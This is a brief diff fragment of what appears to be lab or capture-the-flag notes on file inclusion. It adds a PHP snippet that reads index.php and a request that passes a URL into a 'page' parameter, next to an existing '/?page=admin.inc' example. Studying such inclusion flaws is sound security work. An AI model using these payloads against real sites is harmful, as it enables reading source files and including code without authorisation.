@@ -12,4 +12,12 @@ ____
 /?page=admin.inc
 ```
 
+```php
+<?php echo readfile("index.php")?>
+```
+
+```bash
+/?page=http://localhost/index
+```
+
 
